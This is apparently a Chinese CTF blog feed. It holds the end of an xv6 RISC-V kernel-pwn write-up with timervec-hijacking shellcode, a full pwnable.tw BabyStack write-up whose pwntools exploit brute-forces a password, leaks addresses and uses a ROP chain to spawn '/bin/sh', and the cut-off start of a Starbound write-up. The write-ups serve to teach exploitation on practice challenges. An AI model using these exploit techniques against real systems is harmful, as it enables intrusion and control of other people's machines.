<h3 id="找到未被保护的flag">找到未被保护的Flag</h3>

<p>由于 Flag 是硬编码在 kernel 文件中的，因此我首先想到的办法是<strong>泄露服务器端的 kernel 文件</strong>。但是 xv6 在生成文件系统的时候，并不会将 kernel 放在里面。
我们使用 qemu 启动 xv6 时直接指定了编译好的 kernel，qemu 会把 kernel 直接加载到内存中。</p>

<p>所以在 xv6 系统内，内核只存在于内存中且独一无二，这种方法被证实是不行的（</p>

<h3 id="reset">RESET</h3>

<p>在阅读 RISC-V 手册时，我注意到在 machine mode 中有一个小章节介绍了 Reset 。此时我已经发现了内核代码是可修改的，因此我想到的办法就是将 <code class="language-plaintext highlighter-rouge">start</code> 函数中对 <code class="language-plaintext highlighter-rouge">flag</code> 施加保护的代码覆写为 <code class="language-plaintext highlighter-rouge">nop</code> ，然后进行重启，这样重启后的系统就不会再有对 <code class="language-plaintext highlighter-rouge">flag</code> 的保护。</p>

<p><strong>重启并不是 CPU 负责的事</strong>（CPU 负责的都是计算），准确来说并不是一个指令集所关心的事情。通常，重启是通过 CPU <strong>向主板设备发送信号</strong>来完成的。
在题目环境中，启动 <code class="language-plaintext highlighter-rouge">qemu</code> 时指定使用的主板是 <code class="language-plaintext highlighter-rouge">virt</code> ，一个只具有最基础功能的主板，其描述见 <a href="https://www.qemu.org/docs/master/system/riscv/virt.html">‘virt’ Generic Virtual Platform (virt) — QEMU documentation</a>。</p>

<p>如何知道这个设备能否重启、如何重启呢？反正上面这个文档里我没找到（悲）。
我在 qemu 的源码中找到了该主板设备负责注册重启功能的函数：<a href="https://github.com/qemu/qemu/blob/master/hw/riscv/virt.c#L904">qemu/hw/riscv/virt.c at master · qemu/qemu (github.com)</a>，具体来说是如下几行：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">qemu_fdt_setprop_cells</span><span class="p">(</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">fdt</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="s">"reg"</span><span class="p">,</span>
        <span class="mh">0x0</span><span class="p">,</span> <span class="n">memmap</span><span class="p">[</span><span class="n">VIRT_TEST</span><span class="p">].</span><span class="n">base</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="n">memmap</span><span class="p">[</span><span class="n">VIRT_TEST</span><span class="p">].</span><span class="n">size</span><span class="p">);</span>
    <span class="n">qemu_fdt_setprop_cell</span><span class="p">(</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">fdt</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="s">"phandle"</span><span class="p">,</span> <span class="n">test_phandle</span><span class="p">);</span>
    <span class="n">test_phandle</span> <span class="o">=</span> <span class="n">qemu_fdt_get_phandle</span><span class="p">(</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">fdt</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
    <span class="n">g_free</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>

    <span class="n">name</span> <span class="o">=</span> <span class="n">g_strdup_printf</span><span class="p">(</span><span class="s">"/reboot"</span><span class="p">);</span>
    <span class="n">qemu_fdt_add_subnode</span><span class="p">(</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">fdt</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
    <span class="n">qemu_fdt_setprop_string</span><span class="p">(</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">fdt</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="s">"compatible"</span><span class="p">,</span> <span class="s">"syscon-reboot"</span><span class="p">);</span>
    <span class="n">qemu_fdt_setprop_cell</span><span class="p">(</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">fdt</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="s">"regmap"</span><span class="p">,</span> <span class="n">test_phandle</span><span class="p">);</span>
    <span class="n">qemu_fdt_setprop_cell</span><span class="p">(</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">fdt</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="s">"offset"</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">);</span>
    <span class="n">qemu_fdt_setprop_cell</span><span class="p">(</span><span class="n">ms</span><span class="o">-&gt;</span><span class="n">fdt</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="s">"value"</span><span class="p">,</span> <span class="n">FINISHER_RESET</span><span class="p">);</span>
    <span class="n">g_free</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
</code></pre></div></div>

<p>从这里的代码我们可以大致猜到，映射所采用的是 mmio 方法，地址 <code class="language-plaintext highlighter-rouge">VIRT_TEST</code> 偏移 0 处，如果写入 <code class="language-plaintext highlighter-rouge">FINISHER_RESET</code> 的话就可以进行重启。借助 Github 右栏的引用查找功能，不难找到 <code class="language-plaintext highlighter-rouge">VIRT_TEST</code> 的值为 <code class="language-plaintext highlighter-rouge">0x100000</code>，<code class="language-plaintext highlighter-rouge">FINISHER_RESET</code> 的值为 0x7777。</p>

<p>经过测试，确实可以通过这个方法来 reset 机器。但是我悲伤地发现在 reset 之后，我对内核代码做的修改也一起 reset 了。看来 qemu 每次 reset 都会重新加载一遍 kernel 文件啊。</p>

<h3 id="修改-timervec">修改 timervec</h3>

<p>在测试完上面那种方法不可行后，我就想到了这个方法，但此时离结束比赛只剩下半小时，因此非常可惜没有做完。（后来看官方的 wp 又得知了一些 trick，说不定我自己调也还要调半天）</p>

<p>既然 PMP 只有 machine mode 可以操控或无视，那么我们的目标就是想方设法进入 machine mode。
正好，xv6 对于 timer interrupt 的处理是位于 machine mode 中的。具体来说，会在 <code class="language-plaintext highlighter-rouge">start</code> 函数中调用 <code class="language-plaintext highlighter-rouge">timerinit</code>，来将 <code class="language-plaintext highlighter-rouge">timervec</code> 函数注册到 mtvec 中：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// arrange to receive timer interrupts.</span>
<span class="c1">// they will arrive in machine mode at</span>
<span class="c1">// at timervec in kernelvec.S,</span>
<span class="c1">// which turns them into software interrupts for</span>
<span class="c1">// devintr() in trap.c.</span>
<span class="kt">void</span>
<span class="nf">timerinit</span><span class="p">()</span>
<span class="p">{</span>
  <span class="p">...</span>

  <span class="c1">// set the machine-mode trap handler.</span>
  <span class="n">w_mtvec</span><span class="p">((</span><span class="n">uint64</span><span class="p">)</span><span class="n">timervec</span><span class="p">);</span>

  <span class="c1">// enable machine-mode interrupts.</span>
  <span class="n">w_mstatus</span><span class="p">(</span><span class="n">r_mstatus</span><span class="p">()</span> <span class="o">|</span> <span class="n">MSTATUS_MIE</span><span class="p">);</span>

  <span class="c1">// enable machine-mode timer interrupts.</span>
  <span class="n">w_mie</span><span class="p">(</span><span class="n">r_mie</span><span class="p">()</span> <span class="o">|</span> <span class="n">MIE_MTIE</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>因此，实际上内核在启动进入 supervisor mode 之后，唯一使用 machine mode 执行的代码就是这个 timervec 函数了，实现位于 <code class="language-plaintext highlighter-rouge">kernelvec.S</code> 中：</p>

<pre><code class="language-RISC-V">.globl timervec
.align 4
timervec:
        # start.c has set up the memory that mscratch points to:
        # scratch[0,8,16] : register save area.
        # scratch[24] : address of CLINT's MTIMECMP register.
        # scratch[32] : desired interval between interrupts.
        
        csrrw a0, mscratch, a0
        sd a1, 0(a0)
        sd a2, 8(a0)
        sd a3, 16(a0)

        # schedule the next timer interrupt
        # by adding interval to mtimecmp.
        ld a1, 24(a0) # CLINT_MTIMECMP(hart)
        ld a2, 32(a0) # interval
        ld a3, 0(a1)
        add a3, a3, a2
        sd a3, 0(a1)

        # arrange for a supervisor software interrupt
        # after this handler returns.
        li a1, 2
        csrw sip, a1

        ld a3, 16(a0)
        ld a2, 8(a0)
        ld a1, 0(a0)
        csrrw a0, mscratch, a0

        mret
</code></pre>

<p>这是一个会不定期被触发的、位于 machine mode 中的函数，这个函数的实现位于内核中，且是<strong>可以修改的</strong>。
所以我们劫持这个函数调用 backdoor，就可以让 backdoor 函数在 machine mode 被执行了，从而打印出 Flag。</p>

<p>（这里本来脑子没转过来，想的是让 timervec 把 PMP 给关了，然后我自己调用 backdoor，但这种方法增加了复杂度，不如直接调用 backdoor 简洁）</p>

<p>此外还有一个注意点，就是在进入 timervec 之后，需要使用 <code class="language-plaintext highlighter-rouge">csrw mie, x0</code> （machine-mode interrupt enable）来关闭 machine mode 的各种中断。否则，在读 flag 读一半触发这个中断就不好了。（看官网 wp 学到的）</p>

<p>我的 exp 如下：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"kernel/types.h"</span><span class="cp">
#include</span> <span class="cpf">"kernel/stat.h"</span><span class="cp">
#include</span> <span class="cpf">"user/user.h"</span><span class="cp">
</span>
<span class="cm">/*  hijack timervec:
 *   30401073          	 csrr   mie,x0 (disable timer interrupt)
 *   00060067            jr     a2
 */</span>

<span class="n">uint32</span> <span class="n">a1</span><span class="p">[</span><span class="mh">0x140</span><span class="o">/</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
    <span class="mh">0x00040637</span><span class="p">,</span>     <span class="c1">// li a2, 0x80006214</span>
    <span class="mh">0x0036061b</span><span class="p">,</span>
    <span class="mh">0x00d61613</span><span class="p">,</span>
    <span class="mh">0x21460613</span><span class="p">,</span>

    <span class="mh">0x00040537</span><span class="p">,</span>     <span class="c1">// li a0, 0x80005BF0</span>
    <span class="mh">0x0035051b</span><span class="p">,</span>
    <span class="mh">0x00d51513</span><span class="p">,</span>
    <span class="mh">0xbf050513</span><span class="p">,</span>

    <span class="mh">0x304015b7</span><span class="p">,</span>     <span class="c1">// li a1, 0x30401073</span>
    <span class="mh">0x0735859b</span><span class="p">,</span>
    <span class="mh">0x00b53023</span><span class="p">,</span>     <span class="c1">// sd a1, (a0)</span>
    <span class="mh">0x00450513</span><span class="p">,</span>     <span class="c1">// addi a0, a0, 4</span>

    <span class="mh">0x000605b7</span><span class="p">,</span>     <span class="c1">// li a1, 0x00060067</span>
    <span class="mh">0x0675859b</span><span class="p">,</span>
    <span class="mh">0x00b53023</span><span class="p">,</span>     <span class="c1">// sd a1, (a0)</span>

    <span class="mh">0x0000006f</span><span class="p">,</span>     <span class="c1">// infinte loop</span>
<span class="p">};</span>
<span class="kt">char</span> <span class="n">a3</span><span class="p">[</span><span class="mh">0x140</span><span class="p">];</span>
<span class="kt">char</span> <span class="n">a5</span><span class="p">[</span><span class="mh">0x100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">long</span><span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">a1</span><span class="p">[</span><span class="mh">0x138</span><span class="o">/</span><span class="mi">4</span><span class="p">])</span> <span class="o">=</span> <span class="mh">0x3fffff9e80</span><span class="p">;</span>  <span class="c1">// ra = 0x3fffff9e80 shellcode</span>
    <span class="n">encrypt</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">a1</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="n">a3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">a5</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">);</span>
    
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>另外还有一个坑，就是 backdoor 函数前 N 句汇编是一些栈相关操作，我们需要跳过这几句汇编。否则内核会卡住不动！太坑了！</p>

<p><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/202311290204319.png" alt="" /></p>]]></content><author><name></name></author><category term="pwn" /><category term="riscv" /><category term="kernel-pwn" /><summary type="html"><![CDATA[第一次打内核题，虽然是xv6但还是感觉非常酷。比赛结束前才想到了真的可行的思路，赛后结合官方 writeup 调出来了。]]></summary></entry><entry><title type="html">pwnable.tw BabyStack</title><link href="https://www.cameudis.com/2023/10/24/pwnable-tw-BabyStack-writeup.html" rel="alternate" type="text/html" title="pwnable.tw BabyStack" /><published>2023-10-24T03:51:17+08:00</published><updated>2023-10-24T03:51:17+08:00</updated><id>https://www.cameudis.com/2023/10/24/pwnable-tw-BabyStack-writeup</id><content type="html" xml:base="https://www.cameudis.com/2023/10/24/pwnable-tw-BabyStack-writeup.html"><![CDATA[<p>本地打通了，远程……台湾太远了……爆破到一半就会不知道谁把我连接掐掉……</p>

<p><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/Snipaste_2023-10-23_20-43-43.jpg" alt="" /></p>

<h2 id="漏洞分析">漏洞分析</h2>

<p>本题主要有两个漏洞，一个是检查密码时，根据用户的输入的大小（strlen）作为 strncmp 的参数进行比较，然而这样会导致用户输入 NULL Byte 就通过检查，同时还允许了一字节一字节爆破得到正确的密码；甚至泄露密码后面的别的数据——在本题中就是程序基址。
另一个是一个没有检查大小的 strcpy。</p>

<h2 id="漏洞利用">漏洞利用</h2>

<p>本题的流程就是先利用第一个漏洞来爆破得到栈上的密码以及 saved rbp，然后利用 strcpy 进行控制流劫持。由于 strcpy 限制 null byte 截断，所以我利用程序自己的 read wrapper 函数（CA0 处）来进行第二次写入，这次就可以写入 ROP chain。（这里调试得知 rdi 正好是栈上变量）
第一次写入 ROP chain，我泄露了 libc 的基址，让程序从 start 重头来过；第二次写入 ROP chain，我就直接执行 <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code> 来拿到 shell。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
    <span class="c1"># bruteforce password
</span>    <span class="n">password</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x10</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">):</span>
            <span class="k">if</span> <span class="n">ch</span> <span class="o">==</span> <span class="mh">0x0a</span><span class="p">:</span>
                <span class="k">continue</span>
            <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
            <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"passowrd"</span><span class="p">,</span> <span class="n">password</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">ch</span><span class="p">])</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
            <span class="k">if</span> <span class="sa">b</span><span class="s">"Success"</span> <span class="ow">in</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">():</span>
                <span class="c1"># print(ch)
</span>                <span class="n">password</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">ch</span><span class="p">])</span>
                <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
                <span class="k">break</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="o">!=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"ERROR"</span><span class="p">)</span>
            <span class="nb">exit</span><span class="p">()</span>
    <span class="n">success</span><span class="p">(</span><span class="s">"password: "</span><span class="o">+</span><span class="nb">repr</span><span class="p">(</span><span class="n">password</span><span class="p">))</span>
    <span class="c1"># pause()
</span>
    <span class="c1"># bruteforce saved rbp (progaddr)
</span>    <span class="n">progaddr</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x6</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">):</span>
            <span class="k">if</span> <span class="n">ch</span> <span class="o">==</span> <span class="mh">0x0a</span><span class="p">:</span>
                <span class="k">continue</span>
            <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
            <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"passowrd"</span><span class="p">,</span> <span class="n">password</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'1'</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">progaddr</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">ch</span><span class="p">])</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
            <span class="k">if</span> <span class="sa">b</span><span class="s">"Success"</span> <span class="ow">in</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">():</span>
                <span class="c1"># print(ch)
</span>                <span class="n">progaddr</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">ch</span><span class="p">])</span>
                <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
                <span class="k">break</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">progaddr</span><span class="p">)</span> <span class="o">!=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"ERROR"</span><span class="p">)</span>
            <span class="nb">exit</span><span class="p">()</span>
    <span class="n">progaddr</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">progaddr</span><span class="o">+</span><span class="sa">b</span><span class="s">'</span><span class="se">\0\0</span><span class="s">'</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x1060</span>
    <span class="n">success</span><span class="p">(</span><span class="s">"stackaddr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">progaddr</span><span class="p">))</span>

    <span class="n">my_read</span> <span class="o">=</span> <span class="mh">0xca0</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"passowrd"</span><span class="p">,</span> <span class="mh">0x10</span><span class="o">*</span><span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="o">+</span><span class="mh">0x30</span><span class="o">*</span><span class="sa">b</span><span class="s">'a'</span><span class="o">+</span><span class="n">password</span><span class="o">+</span><span class="mh">0x18</span><span class="o">*</span><span class="sa">b</span><span class="s">'a'</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">progaddr</span><span class="o">+</span><span class="n">my_read</span><span class="p">))</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Copy :"</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>

    <span class="c1"># pause()
</span>
    <span class="c1"># ROP
</span>    <span class="n">start</span> <span class="o">=</span> <span class="mh">0xb70</span>
    <span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x10c3</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
        <span class="n">progaddr</span><span class="o">+</span><span class="n">pop_rdi</span><span class="p">,</span>
        <span class="n">progaddr</span><span class="o">+</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">],</span>
        <span class="n">progaddr</span><span class="o">+</span><span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">],</span>
        <span class="n">progaddr</span><span class="o">+</span><span class="n">start</span><span class="p">,</span>
    <span class="p">])</span>

    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">pack</span><span class="p">(</span><span class="n">progaddr</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x18</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>

    <span class="n">libcaddr</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="sa">b</span><span class="s">'</span><span class="se">\0\0</span><span class="s">'</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
    <span class="n">success</span><span class="p">(</span><span class="s">"libcaddr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libcaddr</span><span class="p">))</span>

    <span class="c1"># bruteforce password again
</span>    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">password</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x10</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">):</span>
            <span class="k">if</span> <span class="n">ch</span> <span class="o">==</span> <span class="mh">0x0a</span><span class="p">:</span>
                <span class="k">continue</span>
            <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
            <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"passowrd"</span><span class="p">,</span> <span class="n">password</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">ch</span><span class="p">])</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
            <span class="k">if</span> <span class="sa">b</span><span class="s">"Success"</span> <span class="ow">in</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">():</span>
                <span class="c1"># print(ch)
</span>                <span class="n">password</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">ch</span><span class="p">])</span>
                <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
                <span class="k">break</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="o">!=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"ERROR"</span><span class="p">)</span>
            <span class="nb">exit</span><span class="p">()</span>
    <span class="n">success</span><span class="p">(</span><span class="s">"password: "</span><span class="o">+</span><span class="nb">repr</span><span class="p">(</span><span class="n">password</span><span class="p">))</span>
    <span class="c1"># pause()
</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"passowrd"</span><span class="p">,</span> <span class="mh">0x10</span><span class="o">*</span><span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="o">+</span><span class="mh">0x30</span><span class="o">*</span><span class="sa">b</span><span class="s">'a'</span><span class="o">+</span><span class="n">password</span><span class="o">+</span><span class="mh">0x18</span><span class="o">*</span><span class="sa">b</span><span class="s">'a'</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">progaddr</span><span class="o">+</span><span class="n">my_read</span><span class="p">))</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Copy :"</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>

    <span class="c1"># pause()
</span>
    <span class="c1"># ROP
</span>    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">pack</span><span class="p">(</span><span class="n">progaddr</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x18</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="n">progaddr</span><span class="o">+</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="n">libcaddr</span><span class="o">+</span><span class="mh">0x000000000018c177</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="n">libcaddr</span><span class="o">+</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]))</span>

    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>]]></content><author><name></name></author><category term="pwnable.tw" /><summary type="html"><![CDATA[本地打通了，远程……台湾太远了……爆破到一半就会不知道谁把我连接掐掉……]]></summary></entry><entry><title type="html">pwnable.tw Starbound</title><link href="https://www.cameudis.com/2023/10/13/pwnable-tw-Starbound-writeup.html" rel="alternate" type="text/html" title="pwnable.tw Starbound" /><published>2023-10-13T22:59:14+08:00</published><updated>2023-10-13T22:59:14+08:00</updated><id>https://www.cameudis.com/2023/10/13/pwnable-tw-Starbound-writeup</id><content type="html" xml:base="https://www.cameudis.com/2023/10/13/pwnable-tw-Starbound-writeup.html"><![CDATA[<p>本题 neta 了星界边境，实现了一个简单的二维探索游戏。</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/mnt/c/Projects/ctf_archive/[pwnable.tw]Starbound/pwn'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x8047000<span class="o">)</span>
    FORTIFY:  Enabled
</code></pre></div></div>

<h2 id="漏洞分析">漏洞分析</h2>

<p>数组下标未检查导致的任意控制流劫持。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// eax</span>
  <span class="kt">char</span> <span class="n">nptr</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span> <span class="c1">// [esp+10h] [ebp-104h] BYREF</span>

  <span class="n">init</span><span class="p">();</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
